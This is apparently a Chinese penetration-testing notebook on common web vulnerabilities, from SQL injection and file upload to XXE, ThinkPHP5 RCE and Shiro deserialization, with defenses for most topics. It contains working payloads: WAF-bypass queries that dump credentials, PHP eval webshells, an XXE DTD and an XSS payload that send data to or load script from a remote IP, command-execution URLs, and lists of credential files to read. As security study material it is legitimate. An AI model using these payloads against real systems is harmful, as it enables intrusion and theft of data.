[TOC]



# web中的常见漏洞

## 注入漏洞

- SQL注入
- 命令注入
- 代码注入
- 表达式注入
- XML外部实体注入

## 文件相关

- 本地/远程文件包含
- 任意文件上传
- 任意文件下载/读取

## 信息泄露

- .svn/.git源代码泄露
- 配置文件、测试文件
- 应用接口暴露
- 备份文件泄露
- 代码托管平台源码泄露

## 业务逻辑安全

- 用户弱口令
- 用户名/密码枚举
- 越权漏洞
- 未授权访问
- 验证码缺陷
- 短信轰炸

## 中间件缺陷

- jboss反序列化
- tomcat文件包含
- weblogic反序列化

## 服务器安全

- 永恒之蓝（MS17-010）
- 操作系统弱口令
- 本地权限提升

## 前端漏洞

- 跨站脚本攻击（XSS）
- 跨站点伪造请求（CSRF）

# sql注入漏洞

## sql注入分类

### 注入点分类

- 数字型
  - id=2'	异常
  - id=2-1	比较id=1
  - id=2-0	比较页面变化
- 字符型
  - id=1'	异常
  - id=1' and 'a'='a	逻辑真
  - id=1' and 'a'='b	逻辑假

- 搜索型
  - id=1'	异常
  - id=1%' --`空格`	正常
  - id=1%' and 1=1 and '%'='	逻辑真
  - id=1%' and 1=2 and '%'='	逻辑假

### 提交方式分类

- get注入
- post注入
- http注入
- cookie注入

### 攻击方式分类

- 带外注入
- 二次注入
- 宽字节注入

### 执行方式分类

- 基于布尔型的盲注
- 基于时间的盲注
- 基于报错的注入
- 联合查询注入
- 堆叠查询注入
- 内联查询注入

## sql注入的绕过技巧

### 字符编码

| tamper脚本            | 描述                                     |
| --------------------- | ---------------------------------------- |
| base64encode          | base64编码payload                        |
| chardoubleencode      | 双url编码                                |
| charencode            | url编码                                  |
| charunicodeencode     | 使用Unicode编码                          |
| charunicodeescape     | 使用Unicode编码                          |
| apostrophemask        | 使用utf-8编码字符`'`，`%EF%BC%87`替换`'` |
| htmlencode            | 使用HTML编码payload                      |
| apostrophennullencode | 使用`%00%27`替换`'`                      |
| overlongutf8          | 对非字符数字进行utf-8编码                |
| overlongutf8moremore  | 对所有payload进行utf-8编码               |

### 同等功能替换

| tamper脚本            | 描述                                                         |
| --------------------- | ------------------------------------------------------------ |
| between               | 使用`BETWEEN`实现>和=功能                                    |
| commalesslimit        | `LIMIT N OFFSET M `替换`LIMIT M,N`，绕过逗号过滤             |
| commalessmid          | `MID(A FROM B FOR C)`替换`MID(A,B,C)`，绕过逗号过滤          |
| concat2concatws       | 使用`caoncat_ws`函数替换`concat`函数                         |
| equaltolike           | 使用`LIKE`替换=                                              |
| greatest              | 使用`GREATEST`函数实现>功能，`1 AND A>B`转换为`1 AND GREATEST(A,B+1)=A` |
| least                 | 使用`LEAST`函数实现>功能，`1 AND A>B`转换为`1 AND LEAST(A,B+1)=B+1` |
| ifnul2ifisnull        | 使用`IF(ISNULL(A),B,A)`替换`IFNULL(A,B)`                     |
| ifnull2casewhenisnull | 使用`CASE WHEN SINULL(A) THEN (B) ELSE (A) END`替换`IFNULL(A,B)` |
| symboliclogical       | 使用&&和'                                                    |

### 内嵌注释符符号
| tamper脚本               | 描述                                                         |
| ------------------------ | ------------------------------------------------------------ |
| commentbeforeparentheses | 在括号前添加注释符`/**/`，如`ABS()`变成`ABS/**/()`           |
| space2comment            | 使用注释符`/**/`替换空格，`SELECT ID FROM USERS`转换为`SELECT/**/ID/**/FROM/**/USERS` |
| space2dash               | 使用注释符`--`替换空格                                       |
| space2hash               | 使用注释符`#`替换空格                                        |
| space2morecomment        | `SELECT ID FROM USERS`转换为`SELECT/**_**/ID/**_**/FROM/**_**/USERS` |
| randomcomments           | 随机插入注释符`/**/`，如`INSERT`转换为`INS/**/E/**/RT`       |
| versionedkeywords        | 使用MySQL特有注释符`/*!*/`，保留关键字，在MySQL中`/*!内容*/`表示内容在MySQL中才执行，其他数据库不会执行 |
| versionedmorekeywords    | 使用MySQL特有注释符`/*!*/`，保留更多关键字                   |


### 绕过云锁

```
?id=-1%20union/*!99999aaaa*/select%201,2,3
?id=-1%20union/*!99999aaaa*/select%201,database/*!99999aaaa*/(),3	database被过滤
?id=-1%20union/*!99999aaaa*/select%20--1,(select%20group_concat(table_name)from%20information_schema.tables),3	select... from被过滤
?id=-1%20union/*!99999aaaa*/select%20--1,(select%20group_concat(table_name)from%20information_schema.tables%20where%20table_schema=database()),3	爆表名
?id=111%20union/*!99999aaaa*/select%20--1,(select%20group_concat(column_name)from%20information_schema.columns%20where%20table_schema=database()%20and%20table_name=%27users%27),3	爆字段
?id=-1%20union/*!99999aaaa*/select%20--1,(select%20group_concat(concat(username,%27~%27,password))from%20security.users),3	查数据
```

## SQL注入防御

- sql预编译
- 后端服务对接受的参数进行合法性验证，如匹配特定的参数类型
- 严格过滤SQL语句中的关键字和特殊符号

# 文件上传漏洞

## 利用前提

- 参数可控：文件名，文件内容，[文件路径]
- 上传文件位于服务器可解析脚本的web目录
- 可直接或间接获取上传文件的绝对路径或相对路径

## 文件上传代码

### 文件写入

Java Native

- FileOutputStream
- FileInputStream
- outputStream.write

SpringBoot

uploadFile.transferTo

### 文件解压缩

Java Native

ZipEntry

### 文件移动（重命名）

Java Native

File renameto

### 文件拷贝

Java Native

- FileChannel
- FileUtils.copyFile
- Files.copy

## 文件上传绕过

### 畸形数据包

- 畸形的请求头字段
- chunked
- 脏数据

### 小众文件后缀

| asp/aspx | .cer   | .cdx  | .asa  | .asax | .ascx | .ashx  | .asmx |
| -------- | ------ | ----- | ----- | ----- | ----- | ------ | ----- |
| php      | .phtml | .php4 | .phpt | .php5 | .php7 | .phps  | .php3 |
| jsp      | .jsw   | .jsv  | .jspx | .jspa | .jspf | .jhtml |       |

### NTFS ADS

- test.php:p.jpg	空文件
- test.php::$INDEX_ALLOCATION	文件夹
- test.php::$DATA	文件

### 00截断

在java中JKD1.7.0_40前的版本中若使用FileOutputStream实现文件上传功能的内容保存，可能导致00截断，绕过黑名单、文件上传白名单检测。之后的版本会对文件路径检查，若文件路径有非法字符，则抛出异常Invalid file path

### .user.ini绕过

自 PHP 5.3.0 起，PHP 支持基于每个目录的 INI 文件配置。此类文件   *仅*被 CGI／FastCGI SAPI 处理。此功能使得 PECL 的 htscanner   扩展作废。如果你的 PHP 以模块化运行在 Apache 里，则用 .htaccess 文件有同样效果。

除了主 php.ini 之外，PHP 还会在每个目录下扫描 INI 文件，从被执行的 PHP 文件所在目录开始一直上升到 web   根目录（[$_SERVER['DOCUMENT_ROOT'\]](https://www.php.net/manual/zh/reserved.variables.server.php)   所指定的）。如果被执行的 PHP 文件在 web 根目录之外，则只扫描该目录。

漏洞形成条件

- nginx服务器
- 服务器脚本语言为php>5.3.0
- 能够上传.use.ini文件
- 服务器使用CGI/FastCGI模式
- 上传目录下有可执行的php文件

漏洞利用

1. 上传.user.ini，内容为`GIF89a auto_append_file=a.k1`，利用GIF89a绕过文件内容检测
2. 上传a.k1文件，内容为`GIF89a <script language="php">eval($_POST[a]);</script>`，利用<script>标签来绕过<?内容过滤
3. 上传index.php文件，内容为`<?php 
   include_once 'a.k1';
   ?>`，包含文件a.k1，然后访问index.php并post数据`a=system("notepad");`执行命令

### .htaccess绕过

漏洞形成条件

- apache服务器
- 能够上传.htaccess文件，一般为黑名单限制。
- AllowOverride All，默认配置为关闭None。
- LoadModule rewrite_module modules/mod_rewrite.so #模块为开启状态
- 上传目录具有可执行权限。

上传.htaccess文件内容为`AddType application/x-httpd-php .png`，将png后缀文件解析为php，在1.png末尾写入`<?php @eval($_POST[123]); ?>`，上传并访问1.png，post数据`123=system("notepad");`执行命令

## 文件上传防御

- 使用白名单策略检查文件扩展名
- 上传文件的目录禁止http请求直接访问。如果需要访问，要上传到和web服务器不同的域名下，并设置该目录不解析脚本
- 上传文件的文件名和目录名由系统根据时间生成，禁止用户自定义

# 文件包含漏洞

## 代码&利用方法

```php
<?php
	$filename=$_GET['page'];
	include($filename);#如果包含出错，只会警告，不影响后续语句执行
//文件包含函数
    #require()#如果包含出错，提出致命错误，不执行后门语句
    #require_once()
    #include_once()
//文件操作函数
    #file()
    #fopen()
    #readfile()
//文件内容操作函数
    #file_get_contents()
    #file_put_contents()
?>
```

- 通过`GET /<?php @eval($_REQUEST['cmd']);?> HTTP/1.1`请求服务器后，会在服务器日志中留下记录，如果服务器日志为默认路径可以通过`?page=/var/log/error.log`来getshell
- 将一句话木马打包成zip格式后，重命名为phpinfo.jpg，上传到服务器images目录后，通过`file=phar://./images/phpinfo.jpg/getshell.php`来getshell

```php
#远程文件包含需要php.ini中设置如下
allow_url_fopen=On
allow_url_include=On
```

## php伪协议

- `file://`访问操作系统本地文件的文件系统`file:///etc/passwd、file://C:\Windows\system.ini`
- `http://`访问http(s)协议的url`?page=http://file.local.com/LFI/phpinfo.txt`
- `ftp://`访问ftp(s)协议的url`?page=ftp://user:pass@ftp.local.com/phpinfo.txt`
- `php://`访问各个I/O流`php://filer php://input`
- `zlib://、zip://`压缩流协议`zip://压缩包绝对路径#压缩文件内的子文件名`
- `data://`数据流协议`data://text/plain;base64,YWJjZA==`
- `glob://`php自带的文件目录管理协议，查找匹配的文件路径模式
- `phar://`php归档（解压）协议`phar://压缩包/压缩文件内的子文件名`

## 例子

```php
<?php
$filename=$_REQUEST['file'];
$file_contents=file_get_contents($filename);
echo $file_contents;
?>
```

- 用`file=php://filter/read=/resource=../config.php`来读取文件
- 用`file=php://filter/read=convert.base64-encode/resource=../config.php`来读取base64编码后的文件

```php
<?php
$filename=$_REQUEST['file'];
$txt=$_GET['txt'];
file_put_contents($filename,$txt);
?>
```

- 用`file=php://filter/write=convert.base64-encode/resource=../info.php&txt=PD9waHAgQGV2YWwoJF9SRVFVRVNUWydjbWQnXSk7Pz4=`来将`<?php @eval($_REQUEST['cmd']);?>`base64编码后的内容写入info.php

## 文件包含防御

- 保证参数用户不可控、不可构造
- 对参数判断，过滤`'.','..','/','\'`字符，同时使用basename()函数处理参数
- 避免使用动态包含，在需要包含的页面中对所有变量初始化

# 任意文件下载或读取漏洞

## 攻击利用点

### windows

- C:\Windows\sytem32\winevt\Logs
- C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
- C:\Windows\sytem32\inetstr\config\applicationHost.config
- C:\WINNT\system32\inetsrv\MetaBase.bin
- C:\Users\Administrator\AppData\Local\Everything\Everything.db

### Linux

- /etc/passwd
- /etc/shadow
- /proc/version
- /etc/issue
- /root/.ssh/id_rsa
- /root/.ssh/known_hosts
- /var/log/secure
- /var/lib/mlocate/mlocate.db
- /etc/rc.local
- /proc/self/environ
- /root/.viminfo
- /root/.bash_history
- /proc/net/arp

### 数据库

- /home/mysql/.mysql_history
- /etc/mysql/conf.d/mysql.cnf
- /etc/redis/redis.conf
- /var/redis/log
- /var/lib/pgsql/9.6/data/postgresql.conf
- /var/lib/pgsql/9.6/data

### 其他

- config.php
- web.config
- web.xml
- jdbc.properties
- webroot.war
- webroot.zip

## 防御策略

- 对参数过滤，过滤`'.','..','/',''`字符
- 限定文件访问范围，如php.ini配置open_basedir为指定目录
- 对于下载文件的目录做好限制，只能下载指定目录下的文件，或者将要下载的文件存入数据库，附件下载时指定数据库中的id即可

# 跨站脚本攻击（xss）

## 反射性

对提交页面的各个参数依次进行xss注入测试，判定是否存在xss漏洞，如`?phone=176"><script>alert(/xxx/)</script><!--&id=1&name=2`

## 储存型

在页面表单提交过程中，依次对提交参数进行xss测试，常见位置如居住地址，机器人客服。

## 常用测试语句

```html
'><script>alert(/xxx/)</script><!--
" onerror=alert(/xxx/) t="
" onmousemove=alert(/xxx/) t="
'><img src=123# onerror=alert(1)>
'><iframe src=http://www.baidu.com><'
</textarea><script>alert(123)</script><!--		存储型
```

## DOM型

```html
'><script>var src=document.createElement('script');src.setAttribute('src','http://169.254.115.76/test.js');document.body.appendChild(src);</script>		远程调用test.jsp:alert(/xss/);脚本
```

常见位置`http://test.com/index.html?1);var src=document.createElement('script');src.setAttribute('src','http://169.254.115.76/test.js');document.body.appendChild(src);(1`

## 防御方法

- 配置CSP
- cookie设置http only
- 对特殊符号进行HTML实体编码`& < > " ' / \ ; [ ] ( )`

# 跨站请求伪造（csrf）

## 检测方式

查看页面对所提交的参数中是否包含唯一性token信息或验证来源页referer头。如果不存在参数，则有csrf漏洞。如果存在参数，删除referer头信息并多次重放，查看是否执行成功，如添加账号、修改个人信息、修改密码、转账，如果成功，则有csrf漏洞。

首先用火狐登录vince账户，抓到修改邮箱的数据包，放到repeater，右键Engagement tools->Generate CSRF POC->test in browser->copy，用谷歌登录allen账户，挂bp代理用谷歌打开复制的网址，Submit request，成功修改allen邮箱为vince邮箱

## 防御方法

- 检测HTTP header中的referer字段，服务器拒绝响应referer不是自己的站点
- 在重要请求中的每一个url和所有表单中添加token
- 修改密码等关键操作添加验证码确认

# 服务端请求伪造（ssrf）

## 检测方法

检测页面中的远程请求功能，如远程下载、远程探测、远程加载等功能，在远程地址参数填写内网地址，查看服务器是否有来自测试对象服务器的请求。如果有，则存在ssrf。

通过访问`http://ssrf.com/remote.jsp?url=http://10.10.10.10:80`的响应信息来判断80端口是否开启

通过访问`http://ssrf.com/ssrf_curl.php?url=file://169.254.115.76/C:\Windows\System32\drivers\etc\hosts`来泄露host文件

## 例子

### http代理

`http://www.ssrf.com/proxy/10.0.1.1:8080/`

### 访问内部资源

`http://www.ssrf.com/content.html?contentUrl=http://192.168.20.36:8080`

### PDF

`http://www.ssrf.com/openPDF?file=http://192.168.20.36:8080`

## 防御方法

- 过滤返回信息，如果web应用是获取PDF文件，需在展示给用户之前先验证返回的信息是不是PDF类型
- 统一错误信息，避免用户可以根据错误信息判断远程服务器的端口状态
- 限制请求的端口为HTTP常用端口，如80，443，8080，8090
- 禁止不需要的协议。仅允许HTTP和HTTPS请求，防止file://，gopher://，ftp://
- 过滤内网ip，限制访问内网资源

# XML外部实体注入（XXE）

## 检测方式-有回显

通常在注册账户，数据更改的位置插入xml测试语句，观察页面响应

```xml
<?xml version="1.0"?><name>vul!!</name>
<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><name>&xxe;</name>		读取win.ini配置文件
<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "expect://whoami">]><root>&xxe;</root>		很难执行命令
```

### 默认协议

| libxml2 | php            | java    | .net  |
| ------- | -------------- | ------- | ----- |
| file    | file           | http    | file  |
| http    | http           | https   | http  |
| ftp     | ftp            | ftp     | https |
|         | php            | file    | ftp   |
|         | compress.zlib  | jar     |       |
|         | compress.bzip2 | netdoc  |       |
|         | data           | mailto  |       |
|         | glob           | goher * |       |
|         | phar           |         |       |

### php扩展协议

| scheme                                                       | extension required |
| ------------------------------------------------------------ | ------------------ |
| https<br />ftps                                              | openssl            |
| zip                                                          | zip                |
| ssh2.shell<br />ssh2.exec<br />ssh2.sftp<br />ssh2.tunnel<br />ssh2.scp | ssh2               |
| rar                                                          | rar                |
| ogg                                                          | oggvorbis          |
| expect                                                       | expect             |

## 检测方式-无回显

将test.dtd放在远程服务器上，远程加载dtd文件:`<!ENTITY % file SYSTEM "file:///c:/windows/win.ini"><!ENTITY % all "<!ENTITY send SYSTEM 'http://169.254.115.76/?%file;'>">%all;`

```xml-dtd
<?xml version="1.0"?><!DOCTYPE data SYSTEM "http://169.254.115.76/test.dtd"><name>&send;</name>
```

提交后，观察远程服务器上的访问日志是否存在测试目标的请求，win.ini文件内容以get提交的方式返回到远程服务器上

## 防御方法

- 对于php，常见的xml解析方法DOMDocument、SimpleXML、XMLReader都是基于expact解析器，默认不载入DTD，无漏洞。可以在php解析xml文件前使用libxml_disable_entity_loader(ture)禁止加载外部实体，并使用libxml_use_internal_errors()禁止报错
- 对于Java，设置DocumentBuilderFactory dbf=DocumentBuilderFactory.newInstance();dbf.setExpandEntityReferences(false);
- 对用户输入的xml数据过滤

# 服务器配置缺陷和信息泄露

## 检测方式

- 对网站目录进行直接访问查看是否可以浏览目录文件列表
- 查看默认中间件示例文件是否存在
- 通过目录扫描工具查看是否存在敏感目录
- 通过文件扫描工具查看是否存在敏感文件
- 通过手工提交畸形参数引起异常，查看异常信息
- 通过抓包查看响应中是否有敏感信息

## 防御方法

- 设置自定义错误跳转页，避免非200响应状态返回默认错误信息
- 关闭调试信息、中间件版本信息
- 关闭错误输出，当web应用出错统一返回错误页面或跳转首页
- 合理设置服务器文件访问权限

# 业务逻辑漏洞

## 未授权访问

1. 成功登录系统后，记录各个功能页面url
2. 重启浏览器并清空登录凭证，或使用隐私模式，访问url查看是否存在未授权访问

### 防御方法

- 明确特定角色对系统功能的访问权限
- 检查并确保当前条件是授权访问的合适状态

## 垂直越权

1. 高权限登录系统
2. 记录高权限功能页面url
3. 登录低权限用户，或使用隐私模式
4. 访问高权限url查看是否存在未授权访问

### 防御方法

- 调用功能前校验用户权限
- 执行操作前验证用户身份

## 验证码缺陷

1. 验证码回传问题，可拦截验证码数据包，检查包中是否有验证码数据
2. 验证码不刷新问题，可包含验证码多次重放，查看是否可用

### 防御方法

- 验证码使用后，立即销毁session，防止多次使用
- 前后台均对验证码进行校验

## 短信轰炸

抓包"获取短信验证码"，多次重放查看是否收到多条验证码

### 防御方法

- 限制手机号的发送次数
- 限制ip次数，超过拒绝发送
- 限制手机号发送时间间隔，如两分钟
- 发送短信需要图片验证码

# 代码执行漏洞

## 检测方式

通过源代码白盒审计，如php重点关注eval，assert，execute，pref_replace函数的参数是否可控，是否严格过滤

```php
<?php
$arg=$_GET['code'];
eval("$arg;");
?>
```

## 防御方法

- 使用addslashes函数进行转义或使用黑白名单过滤
- 禁用或减少使用可执行代码的函数
- 限制web用户权限

# 命令执行漏洞

## 检测方式

- 黑盒测试：关注网站的特殊功能，如ping测试、数据库备份
- 白盒测试：查看命令执行函数参数是否没有过滤可控，如system，shell_exec，popen，passsthru，proc_popen，pcntl_exec

```php
<?php
$arg=$_GET['cmd'];
system("$arg",$ret);
echo 'Return is:'.$ret;
?>
```

深信服edr远程命令执行`https://xxx.xx/tool/log/c.php?strip_slashes=system&host=id`或者`http://xxx.xx/tool/log/c.php?strip_slashes=sytem&path=id`

## 防御方法

- 禁止执行外部应用程序或命令
- 使用escapeshellarg，escapeshellcmd函数处理参数
- 使用safe_modeexec_dir指定可执行的文件路径

# thinkphp5远程命令执行

thinkphp底层没有对控制器名进行严格的合法性校验，，导致在网站没有开启强制路由的情况下，用户可以调用任意类的任意方法，最终导致命令执行。`index.php?s=index/\namespace\class/method`会实例化\namespace\class类并执行method方法。

- 利用index模块、\think\app控制器、同时利用invokefunction方法去反射调用call_user_func_array函数。使用的参数：`function=call_user_func_array`，`vars[0]=phpinfo`，`vars[1][]=-1`，可回显phpinfo。payload：`index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1`。
- 利用index模块、\think\app控制器、同时利用invokefunction方法去反射调用call_user_func_array函数。使用的参数：`function=call_user_func_array`，`vars[0]=shell_exec`，`vars[1][]=id`，可回显id命令。payload：`index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=id`

![thinkphp5.xrec](https://raw.githubusercontent.com/king-notfound404/Penetration-Zbook/main/img/thinkphp5.xrec.png)

# java反序列化

## Java序列号和反序列化demo

window中运行

```java
import java.io.*;

public class JavaSerializeExample{
    public static void main(String[] args) throws Exception{
        //定义myObj对象
        MyObject myobj = new MyObject();
        myobj.name="test";
        //创建一个包含对象进行序列化信息的object.ser数据文件
        ObjectOutputStream os = new ObjectOutputStream(new FileOutputStream("name:" + "object.ser"));
        //writeObject()方法将myObject对象写入object.ser文件
        os.writeObject(myobj);
        os.close();
        //从object.ser文件中反序列化对象
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream("name:" + "object.ser"));
        //通过readObject()方法读取对象
        MyObject objectFromDisk=(MyObject)ois.readObject();
        System.out.println(objectFromDisk.name);
        ois.close();
    }
}
class MyObject implements Serializable{
    public String name;
    //重写readObject()方法
    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
        in.defaultReadObject();
        Runtime.getRuntime().exec("calc.exe");
    }
}
```

## 漏洞条件

- 在应用程序中，通过方法调用、对象传递和反射机制等手段作为跳板，构造出利用链（Gadget Chain），如远程代码执行。
- 当程序中的某个触发点在还原对象过程中，能成功执行构造的利用链，则成为触发点。
- 利用工具[ysoserial](https://github.com/frohoff/ysoserial)

## 反序列化数据特征

- 可以使用xxd命令查看序列化数据的十六进制，头部为：ACED 0005
- 一般截获的数据包中java序列化特征经过base64加密：rO0AB
- 通过工具[SerializationDumper](https://github.com/NickstaDB/SerializationDumper)可以还原序列化数据内容

# shiro反序列化漏洞

shiro-550标志在于cookie中的rememberme字段经过base64+AES解密后就是序列化数据。而且AES填充模式为CBC，iv已知，key为硬编码。找到利用链就可以构造数据进行反序列化命令执行

## 利用条件

- 利用链：原生CommonsCollections 3.2.1、CommonsBeanutils
- 触发点：硬编码key已知，可构造rememberMe字段

## 工具

https://github.com/feihong-cs/ShiroExploit-Deprecated

https://github.com/j1anFen/shiro_attack

# Fastjson暂不更新
